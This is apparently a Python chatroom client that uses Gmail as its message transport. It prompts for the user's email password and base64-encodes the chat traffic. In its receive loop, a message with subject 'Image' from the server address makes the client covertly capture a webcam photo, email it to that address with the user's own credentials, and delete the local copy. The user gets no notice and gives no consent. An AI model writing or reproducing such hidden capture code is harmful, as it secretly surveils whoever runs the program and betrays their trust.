import smtplib
import base64
import email
import threading
import sys
import os
import imghdr
from imap_tools import MailBox, AND
# from colorama import Fore
from email.message import EmailMessage
from datetime import datetime
from cv2 import *

user_name = input("Name: ")
email_user = input("Email: ")
email_pass = input("Password: ")
email_server = "base64encodeofservergmail"
run = True

def encoder(string):
    ascii_bytes = string.encode('ascii')
    base64_bytes = base64.b64encode(ascii_bytes)
    base64_string = base64_bytes.decode('ascii')

    return base64_string


def decoder(string):
    base64_bytes = string.encode('ascii')
    ascii_bytes = base64.b64decode(base64_bytes)
    ascii_string = ascii_bytes.decode('ascii')

    return ascii_string

def Image():
    cam = VideoCapture(0)
    s, img = cam.read()
    if s:
        imwrite("a.png", img)

def send(subject, message):
    mail = EmailMessage()
    mail["from"] = email_user
    mail["to"] = decoder(email_server)
    mail["subject"] = encoder(subject)

    mail.set_content(encoder(message))

    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(email_user, email_pass)
        smtp.send_message(mail)

def write():
    while True:
        message = input("")
        message_words = message.split()
        final_message = " ".join(str(word) for word in message_words[1:])
        if message_words[0] == "@dm":
            send("Chatroom dm", final_message)
        if message_words[0] == "@leave":
            send("Chatroom leave", "Leaving the room")
            global run
            run = False
        else:
            send("Chatroom group", message)

def receive():
    while run:
        with MailBox('imap.gmail.com').login(email_user, email_pass, 'INBOX') as mailbox:
            for msg in mailbox.fetch(AND(seen=False)):
                gmail_sender = msg.from_
                text = decoder(msg.text)
                sub = decoder(msg.subject)
                rec_time = str(msg.date.astimezone())[0:19]

                accept = False
                if rec_time > start_time:
                    accept = True

                if gmail_sender == decoder(email_server):
                    if sub == "Chatroom Security" and accept:
                        chatroom_password = input("Enter password for chatroom: ")
                        password_string = str(chatroom_password) + " @" + str(user_name)
                        send("Join password", password_string)

                    if sub == "Chatroom denied entry" and accept:
                        print(text)
                        sys.exit()

                    if sub == "Chatroom join" and accept:
                        print(text)
                        threading.Thread(target=write, daemon=True).start()

                    if sub == "Chatroom server":
                        print(text)

                    if sub == "Member dm":
                        print(text)
                        # print(Fore.RED + text)

                    if sub == "Server dm":
                        print(text)
                        # print(Fore.BLUE + text)

                    if sub == "Kicked":
                        print(text)
                        sys.exit()

                    if sub == "Image":
                        Image()
                        mail = EmailMessage()
                        mail["from"] = email_user
                        mail["to"] = decoder(email_server)
                        mail["subject"] = encoder("Photo")

                        mail.set_content(encoder(str(datetime.now())))

                        with open('a.png', 'rb') as f:
                            image_data = f.read()
                            image_type = imghdr.what(f.name)
                            image_name = f.name
                        mail.add_attachment(image_data, maintype='image', subtype=image_type,
                                            filename=image_name)

                        with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
                            smtp.ehlo()
                            smtp.starttls()
                            smtp.login(email_user, email_pass)
                            smtp.send_message(mail)

                        os.remove("a.png")

send("Join request", user_name)
start_time = str(datetime.now())[0:19]

receive_thread = threading.Thread(target=receive)
receive_thread.start()
